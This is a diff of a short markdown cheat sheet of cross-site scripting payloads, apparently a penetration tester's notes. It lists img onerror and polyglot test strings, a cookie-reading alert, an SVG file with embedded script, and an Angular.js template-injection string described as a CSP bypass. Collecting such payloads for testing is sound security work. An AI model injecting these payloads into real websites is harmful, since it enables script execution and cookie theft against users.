@@ -1,11 +1,32 @@
-﻿# XSS and Stuff
+# XSS Stuff
+
+## Test Strings
+```
+<img src=x onerror=alert('XSS');>
+<img/src/onerror=prompt(8)>
+<img/src/onerror=alert(document.cookie;)>
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+```
+SVG based XSS:   
+```
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
  
- ## Using Angular.js to bypass CSP
- If you can find a place in a web page where e.g.  `{{7*7}}` gets displayed on client-side as '49' (if its returned as 49, then its server-side template injection!), you can try to bypass CSP with:   
- `{{$on.constructor('alert(1)')()}}`   
- More here: https://book.hacktricks.xyz/pentesting-web/client-side-template-injection-csti
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+<script type="text/javascript">
+alert("SVG XSS");
+</script>
+</svg>
+
+```
+
+## Using Angular.js to bypass CSP
+If you can find a place in a web page where e.g.  `{{7*7}}` gets displayed on client-side as '49' (if its returned as 49, then its server-side template injection!), you can try to bypass CSP with:   
+`{{$on.constructor('alert(1)')()}}`   
+More here: https://book.hacktricks.xyz/pentesting-web/client-side-template-injection-csti
  
- ## XSS Bypasses
+## XSS Bypasses
 
 |   Filter   | Bypass    |
 | --- | --- |
